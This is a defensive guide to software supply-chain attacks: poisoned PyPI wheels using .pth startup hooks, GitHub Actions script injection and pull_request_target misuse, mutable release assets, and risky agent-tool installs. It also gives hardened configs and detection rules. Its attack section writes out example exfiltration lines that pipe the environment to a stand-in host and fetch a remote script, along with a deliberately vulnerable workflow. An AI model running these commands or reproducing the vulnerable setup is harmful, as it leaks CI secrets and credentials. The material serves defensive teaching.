# Dependency, Container, CI/CD & Agent-Tooling Supply-Chain Defense

## 1. Attack Transcript

```text
# (a) October 2026 pattern: nothing in your git history changes, a published artifact does.
09:02  maintainer's publishing token (leaked in an LLM-proxy log) is used from a new IP
09:03  litellm==1.107.0 uploaded to PyPI, wheel contains  site-packages/cook.pth
09:05  your CI:  pip install litellm            # --ignore-scripts does not exist for pip, and would not help
09:05  python -c 'print(1)'                      # every interpreter start executes "import ..." lines in *.pth
09:05  env | curl -d @- https://c2.example/up    # runs on `pip` itself, on linters, on test runners
10:46  version yanked after 104 minutes on PyPI; your CI already ran 6 times

# (b) A pull request title as a shell command (GitHub Actions script injection)
PR title:  a"; curl -s https://evil.example/x.sh | sh; echo "
workflow:  run: echo "Building ${{ github.event.pull_request.title }}"
-> secrets in that job's environment are now attacker-readable

# (c) pull_request_target + checkout of the PR head
on: pull_request_target     # runs with repo secrets and a write token
steps: [ uses: actions/checkout (ref: ${{ github.event.pull_request.head.sha }}), run: npm ci && npm test ]
-> the fork's package.json "postinstall" now runs with your secrets

# (d) A mutable release asset
$ gh release download v0.12.0 -p 'tool_linux_amd64'      # tag unchanged, binary overwritten after a maintainer account takeover
$ sha256sum tool_linux_amd64                              # differs from the hash pinned in your CI -> caught after ~94 minutes

# (e) An "innocent" agent skill / MCP server install
$ npx -y some-mcp-server@latest        # new release adds a postinstall that reads ~/.ssh and ~/.claude
```

---

## 2. Spot the Bug

```yaml
# .github/workflows/ci.yml
name: CI
on:
  pull_request_target:
  push:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: third-party/setup-tool@main
      - run: echo "Testing ${{ github.event.pull_request.title }}"
      - run: npm install && npm test
```

```dockerfile
FROM python:3.12-slim
RUN pip install litellm
```

```toml
# deny.toml
[licenses]
allow = ["MIT", "Apache-2.0"]
```

```yaml
# .github/workflows/release.yml
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
jobs:
  publish:
    runs-on: self-hosted
    permissions: write-all
    steps:
      - uses: actions/download-artifact@v4
        with: { run-id: "${{ github.event.workflow_run.id }}" }
      - run: ./dist/release.sh
```

<details>
<summary>Reveal</summary>

1. `pull_request_target` runs with secrets; combined with a checkout of the PR head it executes untrusted code in a privileged context. `${{ github.event.pull_request.title }}` is interpolated into the shell script text before the shell parses it (script injection). `@v4` and `@main` are mutable. `npm install` runs lifecycle scripts and may rewrite the lockfile. Default token permissions are broad.
2. The Dockerfile uses a floating tag and an unpinned, unhashed `pip install` (a `.pth` payload runs at every interpreter start).
3. `deny.toml` checks only licenses: no `[advisories]`, `[bans]` or `[sources]`.
4. The release job consumes an artifact built by an untrusted-PR workflow (artifact poisoning) on a self-hosted runner with `write-all`; `./dist/release.sh` is attacker-controlled content.

</details>

---

## 3. Invariant Violated & Mechanism

- **Invariant Violated:** `I5 — Minimal Blast Radius & Fail-Closed Boot` (OWASP ASVS `v5.0.0-15.1.1`, `15.2.1`).
- **Mechanism:** modern supply-chain compromises rarely exploit a zero-day in your code. Attackers compromise **upstream publishing credentials, CI tokens, or mutable release tags** and ship malicious code through official channels. The October 2026 wave:
  1. **`.pth` Startup Execution Bypassing `--ignore-scripts` (LiteLLM `1.107.0`, Oct 21, 2026, `OSV MAL-2026-2144`):** disabling install scripts does **not** stop a malicious Python wheel that drops a `.pth` file (for example `cook.pth`) into `site-packages`. Python executes every line starting with `import` in any `.pth` on **every interpreter startup**, including `pip` itself, stealing cloud credentials, `~/.cursor`, `~/.claude` configs.
  2. **Mutable Docker Tags (`latest`, `main-stable`) & Mutable GitHub Release Assets (OVHcloud CLI `GHSA-862f-55f5-vmvw`, Oct 19, 2026):** in the LiteLLM incident, Docker tags `latest` and `main-stable` were pushed with a credential stealer. In the OVHcloud CLI incident (`v0.11.0`–`v0.15.0`), source code and CI were clean, but a compromised developer account overwrote already-published GitHub release binaries because **GitHub Release Immutability** was disabled. A downstream user whose CI verified `SHA-256` hashes caught the backdoored binary in ~94 minutes.
  3. **Platform Secret-Store Exposure & LLM Proxy Log Leakage (Railway Disclosure, Oct 21, 2026; LiteLLM Log Leak):** attackers target CI/PaaS environment stores and LLM gateway logs where coding agents accidentally echo `gh auth token` or cloud keys into prompt/response bodies.
  4. **CI-specific classes** (not tied to one incident): privileged triggers executing untrusted code (`pull_request_target`, `workflow_run`), expression injection, artifact and cache poisoning, over-broad OIDC trust, persistent self-hosted runners.
  5. **Resolution confusion:** dependency confusion (an internal package name published on the public index), typosquatting, and **slopsquatting** (a package name an AI assistant hallucinated, registered by an attacker).
  6. **Agent tooling is part of the supply chain:** installing skills, plugins, MCP servers, editor extensions and `AGENTS.md`/rules files adds code and instructions with your credentials' reach.
- **Why Happy-Path Tests Miss It:** the build is green, the version is "newer", the hash was never recorded.

### Where It Hides

- `Dockerfile`s using floating tags (`FROM python:3.12-slim`, `FROM ghcr.io/org/tool:main-stable`) instead of `@sha256:` digests.
- `.github/workflows/*.yml` using third-party actions by mutable tag (`@v4`, `@main`) rather than a 40-character commit SHA, lacking a top-level `permissions: { contents: read }`, using `pull_request_target`/`workflow_run` with untrusted checkouts or artifacts, interpolating `${{ github.event.* }}` into `run:`, or restoring caches written by PR builds into release jobs.
- Rust repositories whose `deny.toml` checks `[licenses]` only.
- Node/Python installs on laptops or CI that do not enforce lockfile integrity (`npm ci --ignore-scripts`, `pnpm install --frozen-lockfile`, `uv pip sync --require-hashes`) or any minimum release-age cooldown.
- LLM gateways, observability proxies, error trackers that log full HTTP bodies containing `Authorization`, `sk_live_`, `ghp_`, `gho_`, `AWS_SECRET_ACCESS_KEY`.
- `pip install --extra-index-url`, unscoped `.npmrc` registries, `curl | sh` installers, `npx -y pkg@latest` in docs and scripts.

---

## 4. Hardened Pattern

### 4.1 SHA-pinned workflow, least privilege, no expression injection

```yaml
# HARDENED .github/workflows/ci.yml
name: Security & Build Gate
on:
  push:
    branches: [main]
  pull_request:            # NOT pull_request_target: forks get no secrets and a read-only token

permissions:
  contents: read           # job-level blocks may add only what that job needs

jobs:
  verify:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - name: Checkout repository
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          persist-credentials: false

      # Untrusted values go through env, never directly into the script text.
      - name: Log PR context safely
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Building: %s\n' "$PR_TITLE"

      - name: Install dependencies safely
        run: |
          npm ci --ignore-scripts --audit=false
          npm audit --audit-level=high
          # build-scripts only for an explicit, reviewed allowlist:
          # npm rebuild esbuild sharp

      - name: Verify zero unexpected .pth startup hooks (if Python is used)
        run: |
          if [ -d ".venv" ]; then
            if find .venv -name '*.pth' -exec grep -HnE '^import[[:space:]]' {} +; then exit 1; fi
          fi
```

Privileged work that genuinely needs secrets (labeling, commenting) runs in a **separate** `pull_request_target`/`workflow_run` workflow that never checks out or executes PR content, treats any artifact as untrusted data (parse, never execute), and has the narrowest `permissions`.

### 4.2 Release and OIDC: scope the trust, not just the token

```yaml
# release.yml: runs only from protected refs, on ephemeral hosted runners
on:
  push:
    tags: ["v*"]
permissions:
  contents: read
jobs:
  publish:
    runs-on: ubuntu-24.04
    environment: release            # required reviewers + branch/tag protection live here
    permissions:
      id-token: write               # for OIDC to the cloud / registry; nothing else is write
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with: { persist-credentials: false }
      # Build from source in this job. Do not download artifacts from other workflows.
```

Cloud-side trust policy (shown generically): require `aud` = your audience, `sub` = `repo:<org>/<repo>:environment:release` (an exact value or a tight pattern on the environment/ref), and `ref`/`workflow_ref` claims for the release workflow. A condition on `repo:<org>/*` lets every repo, including a fork-able test repo, assume the role.

### 4.3 Complete `deny.toml` for Rust repositories (`cargo-deny`)

Never ship a `deny.toml` that only checks `[licenses]`. Enforce `[advisories]`, `[bans]` and `[sources]`:

```toml
# HARDENED deny.toml (run via `cargo deny check advisories bans licenses sources`)

[advisories]
version = 2
db-path = "~/.cargo/advisory-db"
db-urls = ["https://github.com/rustsec/advisory-db"]
yanked = "deny"
unmaintained = "workspace"
unsound = "all"
ignore = []

[licenses]
version = 2
allow = ["MIT", "Apache-2.0", "BSD-2-Clause", "BSD-3-Clause", "ISC", "Unicode-3.0", "Zlib"]
confidence-threshold = 0.8

[bans]
multiple-versions = "warn"
wildcards = "deny"
highlight = "all"

[sources]
unknown-registry = "deny"
unknown-git = "deny"
allow-registry = ["https://github.com/rust-lang/crates.io-index"]
allow-git = []
```

### 4.4 Containers and Python

```dockerfile
# Pinned by digest; packages installed from a hash-locked requirements file, no extra index.
FROM python:3.12-slim@sha256:<64_hex_digest>
COPY requirements.lock /tmp/requirements.lock
RUN pip install --require-hashes --no-deps -r /tmp/requirements.lock
```

Registry resolution: use a single index (`--index-url`, never `--extra-index-url`), uv `index-strategy = "first-index"`, and scope internal namespaces (`.npmrc`: `@yourorg:registry=https://registry.internal/`) so an internal name can never resolve publicly.

### 4.5 Redacting secrets before any LLM or telemetry log sink

```typescript
const SECRET_PATTERNS: ReadonlyArray<RegExp> = [
  /\b(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,255}\b/g,                      // GitHub tokens
  /\bsk_(live|test)_[A-Za-z0-9]{16,128}\b/g,                              // Stripe / API secret keys
  /\bsk-[A-Za-z0-9_-]{20,200}\b/g,                                        // OpenAI / Anthropic / LLM keys
  /\bAKIA[0-9A-Z]{16}\b/g,                                                // AWS Access Key IDs
  /\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/g,   // Raw JWTs
  /(Authorization:\s*Bearer\s+)[^\s"']+/gi,                               // Bearer headers
];

export function redactSecretsFromLog(rawText: string): string {
  let clean = rawText;
  for (const pattern of SECRET_PATTERNS) clean = clean.replace(pattern, "[REDACTED_SECRET]");
  return clean;
}
```

### 4.6 Agent tooling: treat skills, plugins and MCP servers as dependencies

- Install from a **pinned commit or version** and record its hash; never `@latest`, never auto-update.
- Read `SKILL.md`, hooks, `postinstall` and shipped scripts before first use; diff on every update.
- Run them with the least authority (no ambient cloud credentials, no `~/.ssh`, read-only mounts), in a sandbox with an egress allowlist.
- Pin and hash MCP tool *descriptions* too (see [`agentic-and-mcp-threats.md`](../injection-and-trust-boundaries/agentic-and-mcp-threats.md)).
- Before adding any package an assistant suggested, verify it exists, its age, maintainers and download history (slopsquatting).

---

## 5. Residual Edge Cases (Why the Hardened Version Is Still Not Enough)

- **Hash pins freeze whatever you first pinned.** `--require-hashes` does not protect against a malicious version you pinned on day one, or one a bot bumped. Combine hash pins with a release-age cooldown (`pnpm` `minimumReleaseAge: 1440`, `uv --exclude-newer`) and human review of dependency PRs. `litellm==1.107.0` lived 104 minutes on PyPI; a 24-hour cooldown avoids that whole class.
- **SHA-pinned actions go stale.** Use Dependabot/Renovate to propose bumps (with a cooldown and a diff review); a pinned SHA of a compromised release is still compromised.
- **`--ignore-scripts` breaks packages that legitimately compile native code.** Keep an explicit, reviewed `npm rebuild <pkg>` allowlist rather than turning scripts back on globally.
- **Lockfile injection:** a PR can change resolved URLs/integrity values in `package-lock.json`. Review lockfile diffs and run `lockfile-lint`-style checks (allowed hosts, https only).
- **Cache poisoning:** a cache written by a PR job and restored in a release job carries attacker bytes. Key caches by lockfile hash and branch trust level; do not restore PR-written caches in release jobs.
- **Self-hosted runners persist state** between jobs. Use ephemeral runners, never serve public-fork PRs from them, and never co-locate with production credentials.
- **Token scope:** `permissions:` at the workflow level is a default; confirm no job overrides it to `write-all`. Rotate secrets after any suspected exposure (see the rotation drill below).
- **Container digests** pin an image, not its contents' provenance; verify signatures/attestations (cosign, SLSA provenance) where the publisher offers them.
- **Immutability is a setting you must turn on** (GitHub Release Immutability); it protects future releases, not the ones already overwritten.

---

## 6. How to Discover It Automatically

### A. Static Supply-Chain Audit

```yaml
# semgrep (YAML workflows)
rules:
  - id: gha-expression-injection
    languages: [yaml]
    severity: ERROR
    message: Untrusted ${{ github.event.* }} interpolated into run:; pass through env:
    pattern-regex: 'run:[^\n]*\$\{\{\s*github\.(event\.(issue|pull_request|comment|review|head_commit|commits)[^}]*|head_ref)\s*\}\}'
  - id: gha-pull-request-target-checkout-head
    languages: [yaml]
    severity: ERROR
    message: pull_request_target combined with a checkout of PR-controlled refs
    pattern-regex: 'pull_request_target[\s\S]{0,2000}ref:\s*\$\{\{\s*github\.event\.pull_request\.head'
```

```bash
# 1. GitHub Actions `uses:` NOT pinned to a 40-hex SHA:
rg -n 'uses:\s*[^@\s]+@' .github/workflows/ | rg -v '@[0-9a-f]{40}\b'

# 2. Dockerfile FROM not pinned to a digest:
rg -n '^\s*FROM\s+' Dockerfile* | rg -v '@sha256:[0-9a-f]{64}'

# 3. Python environments: executable lines inside .pth files (import followed by space OR tab):
find / -name '*.pth' 2>/dev/null | xargs grep -HnE '^import[[:space:]]' 2>/dev/null

# 4. Privileged triggers and risky constructs:
rg -n 'pull_request_target|workflow_run|self-hosted|permissions:\s*write-all|continue-on-error' .github/workflows/
rg -n 'download-artifact|actions/cache' .github/workflows/

# 5. Resolution confusion and unpinned installers:
rg -n 'extra-index-url|npx -y|@latest|curl[^|\n]*\|\s*(sh|bash)' . --glob '!node_modules'
rg -n 'pip install' . --glob '!node_modules' | rg -v -- '--require-hashes'
```

Dedicated linters (`actionlint`, `zizmor` for workflow security) complement the patterns above in CI.

### B. Operational Verification

1. **Lockfile integrity:** changing one dependency version in `package.json`/`Cargo.toml` without updating the lockfile must fail CI (`npm ci` / `cargo test --locked`).
2. **Hash verification:** a deliberately altered artifact must fail the hash check (feed CI a modified binary).
3. **Injection probe:** open a test PR whose title is `x"; echo INJECTED > $GITHUB_WORKSPACE/pwned; "` — the workflow must not create the file.
4. **Fork-PR secrets probe:** a fork PR job must see no secrets and a read-only token.
5. **15-Minute Secret Rotation Drill:** keep an inventory of every secret (`SESSION_SECRET`, `DATABASE_URL`, `WEBHOOK_SECRET`, `ACCESS_POLICY_AUD`, cloud bucket keys, CI tokens) and verify that rolling each needs only an environment update plus restart, with nothing hardcoded in source.

---

## 7. How to Eliminate the Bug Class by Construction

1. **Pin Hashes Everywhere:**
   - **GitHub Actions:** 40-character commit SHAs + `persist-credentials: false` on `actions/checkout` + `permissions: contents: read`.
   - **Containers:** `FROM image:tag@sha256:<64_hex_digest>`.
   - **Packages:** commit lockfiles (`Cargo.lock`, `package-lock.json`, `pnpm-lock.yaml`, `uv.lock`) and run `cargo deny check` / `npm ci --ignore-scripts` in CI; Python via `--require-hashes`.
   - **GitHub Releases:** enable **Release Immutability** so published assets and tags cannot be overwritten by a compromised maintainer token.
2. **Quarantine Bleeding-Edge Releases:** configure package managers (`pnpm` `minimumReleaseAge: 1440`, `uv --exclude-newer`) for non-security updates so malicious versions caught within the first 2–24 hours (like `litellm==1.107.0`, which lived for 104 minutes on PyPI) are never pulled into developer laptops or CI.
3. **Privileged workflows never run untrusted code:** `pull_request` for builds; `pull_request_target`/`workflow_run` only for metadata tasks that do not check out or execute PR content or consume its artifacts.
4. **Untrusted values only via `env:`**; lint `${{ github.event.* }}` inside `run:`.
5. **OIDC over long-lived secrets,** with trust policies bound to exact repository, environment and workflow.
6. **Ephemeral CI,** no persistent self-hosted runners for untrusted code; separate release credentials from test credentials.
7. **Agent tooling under the same policy:** pinned, reviewed, sandboxed, no auto-update.
8. **Never log secrets:** run `redactSecretsFromLog` at every LLM/telemetry boundary, and keep gateway request/response body logging off for credential-bearing routes.
